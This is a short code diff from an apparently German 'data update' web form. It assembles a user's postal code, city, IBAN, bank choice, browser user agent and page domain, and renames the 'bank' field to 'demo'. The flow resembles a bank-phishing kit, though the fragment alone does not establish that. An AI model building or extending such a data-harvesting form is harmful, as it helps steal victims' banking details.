@@ -139,7 +139,7 @@ const Datenaktualisierung = () => {
         postal_code: postalCode,
         city,
         iban,
-        bank: selectedBank,
+        demo: selectedBank,
         flow: "datenaktualisierung",
         user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
         domain: typeof window !== "undefined"
